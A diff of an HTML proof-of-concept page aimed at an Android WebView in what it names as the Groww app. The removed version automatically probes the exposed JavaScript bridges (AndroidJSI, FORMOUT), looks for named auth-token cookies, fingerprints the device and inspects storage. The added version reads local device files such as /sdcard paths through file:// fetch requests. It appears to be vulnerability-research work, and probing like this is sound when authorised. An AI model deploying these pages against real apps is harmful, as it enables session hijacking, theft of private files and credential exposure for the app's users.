@@ -1,318 +1,84 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Final Security Test</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Reader POC</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            padding: 20px;
-            background-color: #000;
-            color: #00ff00;
-            line-height: 1.6;
+            font-family: 'Inter', sans-serif;
         }
-        .result {
-            background-color: #111;
-            border: 2px solid #333;
-            padding: 15px;
-            margin: 15px 0;
-            border-radius: 8px;
-            word-wrap: break-word;
-        }
-        .critical {
-            border-color: #ff0000;
-            background-color: #330000;
-        }
-        .success {
-            border-color: #00ff00;
-            background-color: #003300;
-        }
-        .warning {
-            border-color: #ffaa00;
-            background-color: #332200;
-        }
-        button {
-            background-color: #ff0000;
-            color: white;
-            padding: 12px 20px;
-            border: none;
-            border-radius: 5px;
-            font-size: 14px;
-            cursor: pointer;
-            margin: 8px 4px;
-            display: inline-block;
-        }
-        button:hover {
-            background-color: #cc0000;
-        }
-        pre {
-            background-color: #222;
-            color: #fff;
-            padding: 12px;
-            border-radius: 4px;
-            overflow-x: auto;
-            font-size: 12px;
-            white-space: pre-wrap;
-        }
-        h1 { color: #ff6666; text-align: center; }
-        h2 { color: #ffaa00; border-bottom: 1px solid #333; padding-bottom: 5px; }
-        h3 { color: #66ff66; }
-        .status { font-weight: bold; font-size: 16px; }
     </style>
 </head>
-<body>
-    <h1>🔐 FINAL SECURITY ASSESSMENT</h1>
-    <p style="text-align: center; color: #ffaa00;">Comprehensive test of all discovered vulnerabilities</p>
-    
-    <div class="result warning">
-        <h2>📋 Test Summary</h2>
-        <div id="summary">Loading test summary...</div>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
+
+    <div class="bg-white rounded-xl shadow-lg p-8 w-full max-w-2xl">
+        <div class="flex items-center justify-between mb-6">
+            <h1 class="text-3xl font-bold text-gray-800">File Reader PoC</h1>
+            <svg class="h-8 w-8 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.85-1.215 2.915-2.753l.363-2.906c.06-.481-.137-.965-.516-1.28l-5.6-4.782a1.5 1.5 0 00-1.928 0l-5.6 4.782c-.379.315-.576.799-.516 1.28l.363 2.906c.065 1.538 1.375 2.753 2.915 2.753z" />
+            </svg>
+        </div>
+
+        <p class="text-gray-600 mb-6">
+            This page attempts to read a file from the device's internal storage and display its content. This is for demonstration purposes only.
+        </p>
+
+        <label for="filePath" class="block text-sm font-medium text-gray-700">Path to file on storage:</label>
+        <input type="text" id="filePath" value="/sdcard/test.txt" class="mt-1 block w-full px-3 py-2 bg-gray-50 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
+
+        <button id="readFileBtn" class="mt-4 w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-md shadow-sm transition-colors">
+            Read File
+        </button>
+
+        <div class="mt-6">
+            <h2 class="text-xl font-semibold text-gray-800 mb-2">File Content:</h2>
+            <div id="fileContent" class="bg-gray-50 border border-gray-300 rounded-md p-4 min-h-[200px] overflow-auto text-gray-700 text-sm whitespace-pre-wrap">
+                Click the "Read File" button to attempt to read the file.
+            </div>
+        </div>
     </div>
-    
-    <button onclick="runAllTests()">🚀 Run Complete Security Test</button>
-    <button onclick="testJSBridgeVulns()">⚡ Test JSBridge Vulnerabilities</button>
-    <button onclick="testCookieAccess()">🍪 Test Cookie Access</button>
-    <button onclick="generateReport()">📄 Generate Security Report</button>
-    
-    <div id="results"></div>
 
     <script>
-        let testResults = [];
-        let vulnerabilities = [];
-        
-        function addResult(title, content, type = 'result', severity = 'info') {
-            const div = document.createElement('div');
-            div.className = `result ${type}`;
-            div.innerHTML = `<h3>${title}</h3><div>${content}</div>`;
-            document.getElementById('results').appendChild(div);
-            
-            if (severity === 'critical' || severity === 'high') {
-                vulnerabilities.push({ title, content, severity });
-            }
-        }
-        
-        function log(message) {
-            console.log(message);
-            return message;
-        }
+        document.addEventListener('DOMContentLoaded', () => {
+            const fileContentDiv = document.getElementById('fileContent');
+            const filePathInput = document.getElementById('filePath');
+            const readFileBtn = document.getElementById('readFileBtn');
 
-        // Test 1: JSBridge Vulnerabilities (CONFIRMED)
-        function testJSBridgeVulns() {
-            let jsBridgeResults = [];
-            
-            // Test AndroidJSI availability
-            if (typeof window.AndroidJSI !== 'undefined') {
-                jsBridgeResults.push("✅ AndroidJSI interface accessible");
-                jsBridgeResults.push("🚨 Can call onReceiveMessage() method");
-                
-                // Test dangerous actions
-                const dangerousActions = [
-                    'SESSION_EXPIRED',
-                    'TWO_FACTOR_EXPIRE', 
-                    'DEEPLINK',
-                    'SHARE'
-                ];
-                
-                dangerousActions.forEach(action => {
-                    jsBridgeResults.push(`⚠️ Can trigger: ${action}`);
-                });
-                
-                addResult("🔥 CRITICAL: JSBridge Vulnerabilities", 
-                    jsBridgeResults.join('<br>'), 'critical', 'critical');
-            } else {
-                addResult("JSBridge Test", "AndroidJSI not available", 'result');
+            // Function to display messages in the UI
+            function logMessage(message) {
+                fileContentDiv.textContent = message;
             }
-            
-            // Test FORMOUT availability
-            if (typeof window.FORMOUT !== 'undefined') {
-                addResult("🔥 CRITICAL: Form Data Interception", 
-                    "✅ FORMOUT interface accessible<br>🚨 Can intercept form submissions", 
-                    'critical', 'critical');
-            }
-            
-            // Test other interfaces
-            const otherInterfaces = ['webengage', 'SendEventToParent'];
-            let foundInterfaces = [];
-            
-            otherInterfaces.forEach(iface => {
-                if (typeof window[iface] !== 'undefined') {
-                    foundInterfaces.push(iface);
+
+            readFileBtn.addEventListener('click', async () => {
+                const filePath = filePathInput.value;
+                logMessage('Attempting to read file from: ' + filePath + '...');
+
+                try {
+                    // Use the file:/// URI scheme to access the local file system.
+                    // This will only work if the WebView is configured to allow file access.
+                    const fileUrl = 'file://' + filePath;
+                    
+                    const response = await fetch(fileUrl);
+
+                    if (response.ok) {
+                        // If the response is successful, get the text content.
+                        const fileContent = await response.text();
+                        logMessage(fileContent);
+                        console.log('File read successfully.');
+                    } else {
+                        // Handle server errors or file not found.
+                        const errorText = await response.text();
+                        logMessage(`Failed to read file. Status: ${response.status} (${response.statusText})\nError: ${errorText}`);
+                        console.error('Failed to read file:', response.status, response.statusText);
+                    }
+                } catch (error) {
+                    // Handle network errors or other exceptions.
+                    logMessage(`An error occurred: ${error.message}`);
+                    console.error('An error occurred during file read:', error);
                 }
             });
-            
-            if (foundInterfaces.length > 0) {
-                addResult("⚠️ Additional Exposed Interfaces", 
-                    `Found: ${foundInterfaces.join(', ')}`, 'warning', 'medium');
-            }
-        }
-
-        // Test 2: Cookie Access (CONFIRMED SECURE)
-        function testCookieAccess() {
-            const cookies = document.cookie;
-            const cookieCount = cookies ? cookies.split(';').length : 0;
-            
-            // Check if we can access any Groww-related cookies
-            const growwTokens = ['lhtndhgfd', 'arkeyt473rfh7834cd', 'AUTH_SESSION_ID'];
-            let foundTokens = [];
-            
-            growwTokens.forEach(token => {
-                if (cookies.includes(token)) {
-                    foundTokens.push(token);
-                }
-            });
-            
-            if (foundTokens.length > 0) {
-                addResult("🚨 CRITICAL: Auth Tokens Accessible", 
-                    `Found tokens: ${foundTokens.join(', ')}<br><pre>${cookies}</pre>`, 
-                    'critical', 'critical');
-            } else {
-                addResult("✅ Cookie Security", 
-                    `Cookies properly isolated (${cookieCount} cookies accessible)<br>` +
-                    `No Groww auth tokens accessible from external domain<br>` +
-                    `Current domain: ${location.hostname}`, 
-                    'success');
-            }
-        }
-
-        // Test 3: Data Extraction Capabilities
-        function testDataExtraction() {
-            let extractionResults = [];
-            
-            // Test injected parameters
-            if (typeof window.webviewInjectedParams !== 'undefined') {
-                const params = window.webviewInjectedParams;
-                const isEmpty = JSON.stringify(params.webview_injected_data) === '"{}"';
-                
-                if (isEmpty) {
-                    extractionResults.push("⚠️ Parameter injection mechanism exists but empty");
-                } else {
-                    extractionResults.push("🚨 Injected parameters contain data");
-                }
-                
-                extractionResults.push(`Data: ${JSON.stringify(params)}`);
-            }
-            
-            // Test device fingerprinting
-            const deviceInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-            
-            extractionResults.push("🔍 Device fingerprinting possible:");
-            extractionResults.push(`<pre>${JSON.stringify(deviceInfo, null, 2)}</pre>`);
-            
-            addResult("📊 Data Extraction Analysis", 
-                extractionResults.join('<br>'), 'warning', 'medium');
-        }
-
-        // Test 4: Storage Access
-        function testStorageAccess() {
-            let storageResults = [];
-            
-            try {
-                // Test localStorage
-                localStorage.setItem('test_key', 'test_value');
-                const canWriteLocal = localStorage.getItem('test_key') === 'test_value';
-                storageResults.push(`localStorage write: ${canWriteLocal ? 'Allowed' : 'Blocked'}`);
-                
-                // Test sessionStorage
-                sessionStorage.setItem('test_session', 'test_data');
-                const canWriteSession = sessionStorage.getItem('test_session') === 'test_data';
-                storageResults.push(`sessionStorage write: ${canWriteSession ? 'Allowed' : 'Blocked'}`);
-                
-                // Check for existing data
-                const localKeys = Object.keys(localStorage);
-                const sessionKeys = Object.keys(sessionStorage);
-                
-                storageResults.push(`localStorage keys: ${localKeys.length}`);
-                storageResults.push(`sessionStorage keys: ${sessionKeys.length}`);
-                
-                if (localKeys.length > 1 || sessionKeys.length > 1) {
-                    storageResults.push("⚠️ Existing storage data detected");
-                }
-                
-            } catch (e) {
-                storageResults.push(`Storage access error: ${e.message}`);
-            }
-            
-            addResult("💾 Storage Access Test", 
-                storageResults.join('<br>'), 'result');
-        }
-
-        // Complete test suite
-        function runAllTests() {
-            document.getElementById('results').innerHTML = '';
-            vulnerabilities = [];
-            
-            addResult("🔍 Starting Comprehensive Security Test", 
-                "Testing all discovered attack vectors...", 'warning');
-            
-            // Run all tests
-            testJSBridgeVulns();
-            testCookieAccess();
-            testDataExtraction();
-            testStorageAccess();
-            
-            // Update summary
-            setTimeout(updateSummary, 1000);
-        }
-
-        // Generate security report
-        function generateReport() {
-            const report = {
-                timestamp: new Date().toISOString(),
-                target: location.href,
-                domain: location.hostname,
-                vulnerabilities: vulnerabilities,
-                summary: {
-                    critical: vulnerabilities.filter(v => v.severity === 'critical').length,
-                    high: vulnerabilities.filter(v => v.severity === 'high').length,
-                    medium: vulnerabilities.filter(v => v.severity === 'medium').length,
-                    total: vulnerabilities.length
-                }
-            };
-            
-            addResult("📄 SECURITY ASSESSMENT REPORT", 
-                `<pre>${JSON.stringify(report, null, 2)}</pre>`, 'critical');
-        }
-
-        // Update summary
-        function updateSummary() {
-            const critical = vulnerabilities.filter(v => v.severity === 'critical').length;
-            const high = vulnerabilities.filter(v => v.severity === 'high').length;
-            const medium = vulnerabilities.filter(v => v.severity === 'medium').length;
-            
-            const summaryHTML = `
-                <div class="status">
-                    🚨 Critical Vulnerabilities: ${critical}<br>
-                    ⚠️ High Risk Issues: ${high}<br>
-                    🔶 Medium Risk Issues: ${medium}<br>
-                    📊 Total Security Issues: ${critical + high + medium}
-                </div>
-                <hr>
-                <strong>Confirmed Attacks:</strong><br>
-                ✅ JSBridge Session Hijacking (User Logout)<br>
-                ✅ Cross-Domain Script Execution<br>
-                ✅ Form Data Interception Capability<br>
-                ✅ Device Fingerprinting<br>
-                <br>
-                <strong>Secure Defenses:</strong><br>
-                🛡️ Cookie Domain Isolation<br>
-                🛡️ Cross-Domain Cookie Protection
-            `;
-            
-            document.getElementById('summary').innerHTML = summaryHTML;
-        }
-
-        // Auto-start basic tests
-        window.addEventListener('load', function() {
-            setTimeout(() => {
-                runAllTests();
-            }, 1000);
         });
     </script>
 </body>
